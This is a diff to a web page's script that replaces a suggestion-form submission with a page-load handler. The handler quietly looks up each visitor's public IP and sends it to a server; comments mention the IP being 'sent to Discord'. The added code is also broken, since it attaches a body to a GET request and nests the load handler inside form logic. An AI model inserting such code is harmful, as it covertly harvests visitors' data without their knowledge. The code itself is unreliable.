@@ -318,22 +318,29 @@
             }
 
             // Send data to local server
-            fetch('http://127.0.0.1:5000/submit', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ name, suggestion }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-                showNotification('Thank you for your suggestion!');
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                showNotification('An error occurred. Please try again.');
-            });
+           window.onload = function() {
+    getPublicIP().then(userIP => {
+        fetch('http://127.0.0.1:5000/', {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ ip: userIP }), 
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Success:', data);
+            // You can add a notification if needed
+            // showNotification('IP sent to Discord!'); 
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            // You can add an error notification if needed
+            // showNotification('An error occurred while sending your IP.'); 
+        });
+    });
+};
+
 
             // Clear inputs
             nameInput.value = '';
